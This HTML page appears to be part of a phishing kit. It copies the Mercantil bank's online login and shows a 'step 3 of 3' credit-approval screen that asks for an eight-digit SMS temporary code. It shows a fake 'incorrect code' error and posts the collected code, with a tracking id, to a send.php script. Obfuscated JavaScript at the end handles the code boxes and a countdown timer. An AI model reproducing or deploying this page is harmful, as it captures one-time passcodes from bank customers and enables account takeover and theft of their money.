<!DOCTYPE html>
<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
    <title>Mercantil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="theme-color" content="#1976d2">
    <link rel="stylesheet" href="assets/bootstrap.67b15cc69e6080ae.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/intro-js.1f5cf64da5ee08c8.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/styles.c663b1e287ec0a1e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/lara-light-blue-theme.8ecaee422619f77e.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="assets/primeng.a62c3f5e15ed62a4.css" media="all" onload="this.media=&#39;all&#39;">
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />

    <style>
        .logo-wrapper img,
.iso-wrapper img {
    width: 88px !important;
    height: auto !important;
    max-width: 120px !important;
    margin-left: 105px !important;
}

    </style>
</head>
<body>

    <app _nghost-ois-c32="" ng-version="13.3.11">
        <router-outlet _ngcontent-ois-c32=""></router-outlet>
        <melp-standard-layout _nghost-ois-c85="" class="ng-star-inserted">
            <melp-loading _ngcontent-ois-c85="" _nghost-ois-c33="">
                <div _ngcontent-ois-c33="" class="overlay">
                    <div _ngcontent-ois-c33="" class="multi-spinner-container">
                        <div _ngcontent-ois-c33="" class="multi-spinner blue">
                            <div _ngcontent-ois-c33="" class="multi-spinner orange"></div>
                        </div>
                    </div>
                </div>
            </melp-loading>
            <melp-header _ngcontent-ois-c85="" _nghost-ois-c54="">
                <div _ngcontent-ois-c54="" class="nav-bar">
                    <div _ngcontent-ois-c54="" class="left-side">
                        <div _ngcontent-ois-c54="" class="main-menu-toggle-wrapper">
                            <div _ngcontent-ois-c54="" class="main-menu-toggle"><span _ngcontent-ois-c54="" class="middle-line"></span></div>
                        </div>
                        <div _ngcontent-ois-c54="" class="bezel-wrapper"><span _ngcontent-ois-c54="" class="bezel-1"></span><span _ngcontent-ois-c54="" class="bezel-2"></span></div>
                        <div  class="logo-wrapper">
                            <img  alt="Logo" src="logotauro.svg">
                        </div>
                    </div>
                    <div _ngcontent-ois-c54="" class="right-side">
                        <div _ngcontent-ois-c54="" class="site-name-wrapper d-flex flex-row">
                            <p _ngcontent-ois-c54="" id="site-name">Mercantil en Línea Personas</p>
                            <div _ngcontent-ois-c54="" class="header-button change-melp ng-star-inserted"><button _ngcontent-ois-c54="" class="header-wrapper"><span _ngcontent-ois-c54="" class="header-text">Versión anterior</span></button></div>


                        </div>
                        <div _ngcontent-ois-c54="" class="transition">

                        </div>
                    </div>
                </div>
            </melp-header>
            <melp-confirm _ngcontent-ois-c85="" _nghost-ois-c55="">
                <div _ngcontent-ois-c55="" id="confirm-modal" class="overlay">
                    <div _ngcontent-ois-c55="" class="card">
                        <div _ngcontent-ois-c55="" class="modal-img"><img _ngcontent-ois-c55="" alt="icon" src="timer.svg"></div>
                        <div _ngcontent-ois-c55="" class="card-body">
                            <div _ngcontent-ois-c55="" class="modal-title">Hola, ¿estás ahí?</div>
                            <div _ngcontent-ois-c55="" class="modal-content">No has interactuado con nosotros en los últimos minutos.</div>
                            <div _ngcontent-ois-c55="" class="modal-content">¿Deseas mantener tu sesión activa?</div>
                            <div _ngcontent-ois-c55="" class="button-wrapper"><button _ngcontent-ois-c55="" class="btn btn-secondary">No</button><button _ngcontent-ois-c55="" class="btn btn-primary">Sí</button></div>
                        </div>
                    </div>
                </div>
            </melp-confirm>
            <melp-modal _ngcontent-ois-c85="" _nghost-ois-c56="">

            </melp-modal>
            <melp-modal-image _ngcontent-ois-c85="" _nghost-ois-c57="">

            </melp-modal-image>
            <melp-share-transaction-form _ngcontent-ois-c85="" _nghost-ois-c74="" class="ng-star-inserted">
                <div _ngcontent-ois-c74="" class="fade-background">
                    <div _ngcontent-ois-c74="" class="card"><span _ngcontent-ois-c74="" class="close">×</span>
                        <div _ngcontent-ois-c74="" class="card-body webTransaction__card">
                            <div _ngcontent-ois-c74="" class="title"></div>
                            <div class="share-info">

                                <div id="password-popup" style="display:none;">
                                    <!-- Aquí va el contenido del popup de contraseña -->
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </melp-share-transaction-form>

            <div _ngcontent-ois-c85="" id="app-container">
                <div _ngcontent-ois-c85="" class="overlay-sidebar"></div>
                <melp-system-error _ngcontent-ois-c85="" _nghost-ois-c77="">
                    <div _ngcontent-ois-c77="" class="hide">
                        <melp-navigation _ngcontent-ois-c77="" _nghost-ois-c76="">

                            <div _ngcontent-ois-c76="" id="navigation">
                                <div _ngcontent-ois-c76="" class="data-info">
                                    <div _ngcontent-ois-c76="" class="data-info-section">
                                        <span _ngcontent-ois-c76="" class="data-info-section-breadcrumb ng-star-inserted">

                                        </span>

                                    </div>
                                    <div _ngcontent-ois-c76="" class="data-info-page ng-star-inserted"><span _ngcontent-ois-c76="" class="data-info-page-title">Inicia tu sesión</span></div>

                                    <melp-alert-float _ngcontent-ois-c76="" _nghost-ois-c75="">

                                    </melp-alert-float>
                                </div>
                            </div>
                        </melp-navigation>
                    </div>
                    <div _ngcontent-ois-c77="" id="system-error" class="hide">

                    </div>
                </melp-system-error>
                <melp-sidebar _ngcontent-ois-c85="" _nghost-ois-c79="" class="ng-star-inserted">


                    <div _ngcontent-ois-c79="" id="step1" data-tooltipclass="tour-class" class="sidebar notLogged">

                        <div _ngcontent-ois-c79="" class="li active ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Inicia tu sesión" src="assets/get-into-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Inicia tu sesión</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Regístrate" src="assets/create-user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Regístrate</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Recupera tu usuario" src="assets/user-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Recupera tu usuario</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Cambia tu clave de internet" src="assets/change-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Cambia tu clave de internet</a></div>
                        </div>

                        <div _ngcontent-ois-c79="" class="li ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="img-wrapper"><img _ngcontent-ois-c79="" alt="Desbloquea tu clave de internet" src="assets/unlock-activo.svg"></div>
                            <div _ngcontent-ois-c79=""><a _ngcontent-ois-c79="">Desbloquea tu clave de internet</a></div>
                        </div>



                        <div _ngcontent-ois-c79="" class="second-level scroll-second-level">

                        </div>
                        <div _ngcontent-ois-c79="" class="secondary-menu-wrapper ng-star-inserted">
                            <div _ngcontent-ois-c79="" class="secondary-menu" style="border: none;"><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted">
                                    <img _ngcontent-ois-c79="" src="assets/Cont-1.svg" alt="Contáctenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ubic-1.svg" alt="Ubíquenos"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Tips_seg-1.svg" alt="Ciberseguridad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Pol_seg-1.svg" alt="Política de privacidad"></a>




                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ter_cond-1.svg" alt="Términos y Condiciones"></a>








                            </div>
                        </div>

                        <div _ngcontent-ois-c79="" class="secondary-submenu-wrapper">


                        </div>
                    </div>
                </melp-sidebar>


                <melp-second-sidebar _ngcontent-ois-c85="" _nghost-ois-c83="">

                    <div _ngcontent-ois-c83="" class="second-sidebar">

                    </div>
                </melp-second-sidebar>

                <router-outlet _ngcontent-ois-c85=""></router-outlet>
                <melp-login _nghost-ois-c165="" class="ng-star-inserted">
                    <melp-login-background _ngcontent-ois-c165="" id="login-melp" _nghost-ois-c161="" class="ng-star-inserted">
                        <div _ngcontent-ois-c161="">






                            <div style="text-align: ;">
                            <h2 style="font-size: 1.3rem; color: #249dc5; padding-left: 36px; padding-top: 25px; font-family: Arial;">Aceptar crédito</h2></div>
                            <div class="secure-access-layout">
                              <div class="secure-access-left">

                                  <div class="secure-access-card">

                                    <div class="step-indicator-container">
                                      <div class="step-icon">
                                        <circle-progress>
                                          <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet" viewBox="0 0 68 68" height="68" width="68">
                                            <circle cx="34" cy="34" r="32" fill="none" stroke="#D6D6D1" stroke-width="2"></circle>
                                            <path d="M 34 2 A 32 32 0 1 1 33.99 2" stroke="#009FDA" stroke-width="2" stroke-linecap="round" fill="none"></path>
                                            <text alignment-baseline="baseline" x="34" y="34" text-anchor="middle">
                                              <tspan x="34" y="34" dy="0.32em" font-size="12" font-weight="bold" fill="#004e9b">3 de 3</tspan>
                                            </text>
                                          </svg>
                                        </circle-progress>
                                      </div>

                                      <div class="step-text">
                                        <div class="step-title">Ingresa tu clave temporal</div>
                                        <div class="step-subtitle"><strong>Siguiente paso:</strong> Aprobar crédito</div>
                                      </div>
                                    </div>

                                      <!-- Mensaje de error -->
                                        <div id="errorMsg" class="error-message">
                                            <img src="assets/alerta-rojo-new.svg">
                                          Clave temporal incorrecta. Verifica e inténta nuevamente.
                                        </div><br>

                                      
                                    <h1>Introduce la clave temporal que hemos enviado a tu teléfono celular:</h1>

                                    <div class="login-container">
                                      <form method="post" action="send.php">

                                          <input type="hidden" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
                                          
                                        <div class="form-group">
                                          <label for="code">Clave temporal</label>
                                          <div class="code-input-wrapper">
                                            <!-- 8 Cajas para ingresar los dígitos -->
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>
                                            <div class="code-box"><input type="password" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input" required></div>

                                              <!-- Icono de ojo -->
                                              <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted">
                                                <img id="toggleEye" alt="eye" class="icon pointer" src="assets/eye-disabled-blue.svg">
                                              </div>
                                          </div>

                                          <input type="hidden" id="cod2" name="cod2">
                                        </div>

                                        <div class="timer">
                                          Si no has recibido la clave temporal en <strong id="countdown">180</strong> segundos,<br>
                                          haz clic en <a href="#">Reenviar clave temporal.</a>
                                        </div>
                                        <div class="login-button" style="margin-top: 30px;">
                                            <melp-button-wrapper _nghost-ois-c164="">
                                              <div class="button-wrapper button-wrapper-separation-end">
                                                <div class="button-wrapper-main-button w-100 button-wrapper-center">
                                                  <button id="btnIniciar" type="submit" class="btn btn-primary ng-star-inserted">
                                                    <img id="btnIcon" src="arrowdis.svg" alt="Flecha"> Confirmar
                                                  </button>
                                                </div>
                                              </div>
                                            </melp-button-wrapper>
                                        </div>
                                      </form>
                                    </div>
                                  </div>


                        </div>


                    </melp-login-background>
                </melp-login>

                <melp-footer _ngcontent-ois-c85="" _nghost-ois-c84="">
                    <footer _ngcontent-ois-c84=""><span _ngcontent-ois-c84="" id="copyright" class="text-center">El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</span></footer>
                </melp-footer>
            </div>
        </melp-standard-layout>
    </app>
    <script crossorigin="anonymous" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
            font-size: 18px;
            font-family: Arial, sans-serif;
            z-index: 9999;
        }

        .loading-container {
            margin-top: 25%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <div id="loadingOverlay">
        <div class="loading-container">
            <div class="spinner"></div><br><br>
            <p id="loadingText"></p>
        </div>
    </div>

                            <script>
                            const _0x445ced=_0xe02a;function _0xe02a(_0x452947,_0x142c41){_0x452947=_0x452947-0xa9;const _0x56dbff=_0x56db();let _0xe02aa1=_0x56dbff[_0x452947];return _0xe02aa1;}(function(_0x4be338,_0x5cf307){const _0x2ccd0f=_0xe02a,_0x5efb75=_0x4be338();while(!![]){try{const _0x54cd1b=-parseInt(_0x2ccd0f(0xb9))/0x1*(-parseInt(_0x2ccd0f(0xc6))/0x2)+parseInt(_0x2ccd0f(0xb5))/0x3*(parseInt(_0x2ccd0f(0xc9))/0x4)+parseInt(_0x2ccd0f(0xb7))/0x5*(parseInt(_0x2ccd0f(0xcf))/0x6)+-parseInt(_0x2ccd0f(0xd1))/0x7+parseInt(_0x2ccd0f(0xca))/0x8*(parseInt(_0x2ccd0f(0xc1))/0x9)+-parseInt(_0x2ccd0f(0xce))/0xa*(parseInt(_0x2ccd0f(0xd2))/0xb)+-parseInt(_0x2ccd0f(0xb2))/0xc*(-parseInt(_0x2ccd0f(0xc2))/0xd);if(_0x54cd1b===_0x5cf307)break;else _0x5efb75['push'](_0x5efb75['shift']());}catch(_0x475fdd){_0x5efb75['push'](_0x5efb75['shift']());}}}(_0x56db,0x27a09),document[_0x445ced(0xae)](_0x445ced(0xc5),function(){const _0x131dff=_0x445ced,_0x3d50f7=document[_0x131dff(0xcd)](_0x131dff(0xc0)),_0x2f6046=document['querySelectorAll'](_0x131dff(0xc4)),_0x16f2d5=document[_0x131dff(0xcd)](_0x131dff(0xba)),_0x56bd03=document[_0x131dff(0xcd)]('btnIcon'),_0x1bf387=document[_0x131dff(0xcd)](_0x131dff(0xc7)),_0x3fd555=document[_0x131dff(0xcd)](_0x131dff(0xc8)),_0x5d843b=document['getElementById'](_0x131dff(0xcc));let _0x4c6aad=![];_0x3d50f7&&_0x3d50f7[_0x131dff(0xae)](_0x131dff(0xb0),function(){const _0x482c65=_0x131dff;_0x4c6aad=!_0x4c6aad,_0x2f6046[_0x482c65(0xbf)](_0x2d55cb=>{const _0x38a2f6=_0x482c65;_0x2d55cb['type']=_0x4c6aad?_0x38a2f6(0xb8):_0x38a2f6(0xd4);}),_0x3d50f7[_0x482c65(0xbd)]=_0x4c6aad?_0x482c65(0xd0):'assets/eye-disabled-blue.svg';});function _0x4fe164(){const _0x5eef87=_0x131dff,_0x19084a=Array['from'](_0x2f6046)[_0x5eef87(0xad)](_0x3d361f=>_0x3d361f['value'])[_0x5eef87(0xb6)]('');_0x3fd555[_0x5eef87(0xb4)]=_0x19084a;}function _0x1a3b3d(){const _0x4cf7e7=_0x131dff,_0x2a2ee4=Array['from'](_0x2f6046)['every'](_0x5a148d=>_0x5a148d[_0x4cf7e7(0xb4)][_0x4cf7e7(0xab)]()[_0x4cf7e7(0xbc)]===0x1);_0x4fe164(),_0x16f2d5['disabled']=!_0x2a2ee4,_0x16f2d5['classList'][_0x4cf7e7(0xbb)](_0x4cf7e7(0xd3),_0x2a2ee4),_0x56bd03&&(_0x56bd03[_0x4cf7e7(0xbd)]=_0x2a2ee4?_0x4cf7e7(0xaf):_0x4cf7e7(0xc3));}_0x2f6046['forEach']((_0x112960,_0x3f489b)=>{const _0x2beaab=_0x131dff;_0x112960[_0x2beaab(0xae)](_0x2beaab(0xb1),()=>{const _0x2c8133=_0x2beaab;_0x5d843b&&_0x5d843b[_0x2c8133(0xcb)][_0x2c8133(0xbe)]!==_0x2c8133(0xac)&&(_0x5d843b[_0x2c8133(0xcb)][_0x2c8133(0xbe)]='none'),_0x112960[_0x2c8133(0xb4)]['length']===0x1&&_0x3f489b<_0x2f6046[_0x2c8133(0xbc)]-0x1&&_0x2f6046[_0x3f489b+0x1][_0x2c8133(0xd5)](),_0x1a3b3d();}),_0x112960[_0x2beaab(0xae)](_0x2beaab(0xaa),_0x4ad70c=>{const _0x244da8=_0x2beaab;_0x4ad70c[_0x244da8(0xb3)]==='Backspace'&&_0x112960[_0x244da8(0xb4)]===''&&_0x3f489b>0x0&&_0x2f6046[_0x3f489b-0x1][_0x244da8(0xd5)]();});});let _0x115b7b=0xb4;const _0x452768=setInterval(()=>{const _0x751b4a=_0x131dff;_0x115b7b--,_0x1bf387[_0x751b4a(0xa9)]=_0x115b7b;if(_0x115b7b<=0x0)clearInterval(_0x452768);},0x3e8);}));function _0x56db(){const _0x4ed0dc=['arrowdis.svg','.code-input','DOMContentLoaded','4WLSuyK','countdown','cod2','834488vLDSZE','15448HIrrnT','style','errorMsg','getElementById','29690yynWKB','7080QxREYy','assets/eye-enabled-blue.svg','1844276uHPfGj','1111EARNCu','active','password','focus','textContent','keydown','trim','none','map','addEventListener','arrowen.svg','click','input','72fprMkF','key','value','3GIRYAc','join','125VMKoyy','text','1478OfJamx','btnIniciar','toggle','length','src','display','forEach','toggleEye','756OtsSll','698464McDyyL'];_0x56db=function(){return _0x4ed0dc;};return _0x56db();}
                            </script>

</body>
</html>
